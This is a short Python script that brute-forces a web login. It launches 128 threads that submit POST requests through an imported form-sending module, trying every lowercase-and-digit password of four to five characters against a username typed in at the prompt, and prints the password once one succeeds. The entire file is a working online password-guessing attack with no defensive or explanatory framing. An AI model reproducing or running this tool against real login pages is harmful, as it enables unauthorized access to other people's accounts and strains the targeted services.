import os
import string
from time import sleep
from SendPostForm import Session, SetUsername, PostRequest
from itertools import chain, product
from queue import Queue
from threading import Thread


NUM_THREADS = 128
q = Queue()

printable = list(string.ascii_lowercase) + list(string.digits)


def bruteforce():

    SessionData = Session()

    while True:

        password = q.get()

        # Use for benchmarking with `time python3 MTPasswordGen.py`
        # if password == "abcd":
        #     print("Checkpoint")
        #     os._exit(1)

        if PostRequest(SessionData, password):
            print("Password found!: "+password)
            os._exit(1)
        else:
            print("Failed using: "+password)

        q.task_done()


if __name__ == '__main__':

    SetUsername(str(input("Enter username: ")))

    for t in range(NUM_THREADS):
        Thread(target = bruteforce, daemon = True).start()

    for candidate in chain.from_iterable(product(printable, repeat = i) for i in range(4, 6)):
        pswd = "".join(candidate)
        q.put(pswd)

    q.join()
